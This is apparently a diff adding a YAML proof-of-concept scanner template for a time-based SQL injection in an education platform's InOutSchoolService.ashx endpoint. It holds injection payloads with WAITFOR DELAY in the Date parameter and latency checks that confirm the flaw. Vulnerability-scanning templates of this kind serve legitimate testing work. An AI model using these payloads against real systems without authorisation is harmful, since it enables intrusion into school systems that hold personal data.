@@ -1,0 +1,25 @@
+name: poc-yaml-EDU-zhihuipingtai-PersonalDayInOutSchoolData-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A4%27--&AccountNo=1
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A8%27--&AccountNo=1
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487736&idx=1&sn=e2c826aa5c8931cc7b8de68caa47b576&chksm=c267a5cbf5102cdd521d070441d1724d56bca3edc57ec02eb1fbc99877b099f40ea7d839371c&token=65579130&lang=zh_CN#rd
